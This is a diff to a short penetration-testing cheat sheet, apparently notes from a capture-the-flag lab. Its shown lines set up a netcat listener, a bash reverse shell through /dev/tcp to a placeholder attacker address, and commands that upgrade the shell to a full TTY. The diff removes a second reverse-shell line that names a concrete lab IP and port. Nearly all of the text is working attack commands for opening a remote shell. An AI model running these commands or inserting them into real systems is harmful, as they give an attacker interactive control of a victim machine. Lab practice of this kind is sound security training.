@@ -16,7 +16,6 @@ nc -lvnp 443
 
 ```bash
 bash -c "bash -i >& /dev/tcp/{YOUR_IP}/443 0>&1"
-bash -c "bash -i >& /dev/tcp/10.10.14.63/4444 0>&1"
 ```
 
 ## Back to Source Machine
@@ -28,8 +27,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.63/4444 0>&1"
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 CTRL-Z
-stty raw -echo
-fg
+stty raw -echo; fg
 export TERM=xterm
 ```
 
